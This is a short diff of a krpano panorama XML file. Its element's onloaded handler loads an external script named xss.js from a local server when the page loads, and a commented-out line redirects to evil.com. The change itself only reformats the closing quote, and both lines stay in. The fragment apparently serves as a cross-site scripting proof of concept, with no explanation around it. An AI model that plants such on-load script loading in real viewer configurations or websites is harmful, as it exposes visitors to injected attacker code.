@@ -3,5 +3,6 @@
            type="container" 
            visible="true" 
            onloaded="loadjs('http://localhost:8080/xss.js');
-        //openurl('https://evil.com', _parent);"/>
+        //openurl('https://evil.com', _parent);
+        "/>
 </krpano>
